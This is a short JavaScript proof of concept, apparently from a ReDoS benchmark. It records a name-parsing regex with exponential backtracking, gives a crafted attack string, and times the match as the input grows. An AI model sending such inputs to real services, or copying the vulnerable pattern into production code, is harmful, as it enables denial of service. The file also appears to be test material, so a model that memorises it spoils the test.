/* 5811
 * ^(?<title>.*\.\s)*(?<firstname>([A-Z][a-z]+\s*)+)(\s)(?<middleinitial>([A-Z]\.?\s)*)(?<lastname>[A-Z][a-zA-Z-']+)(?<suffix>.*)$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+".\t"*32+"! _1_EOA(iii)"
 */
var REGEX = /^(?<title>.*\.\s)*(?<firstname>([A-Z][a-z]+\s*)+)(\s)(?<middleinitial>([A-Z]\.?\s)*)(?<lastname>[A-Z][a-zA-Z-']+)(?<suffix>.*)$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '.\t'.repeat(i*1) + '! _1_EOA(iii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}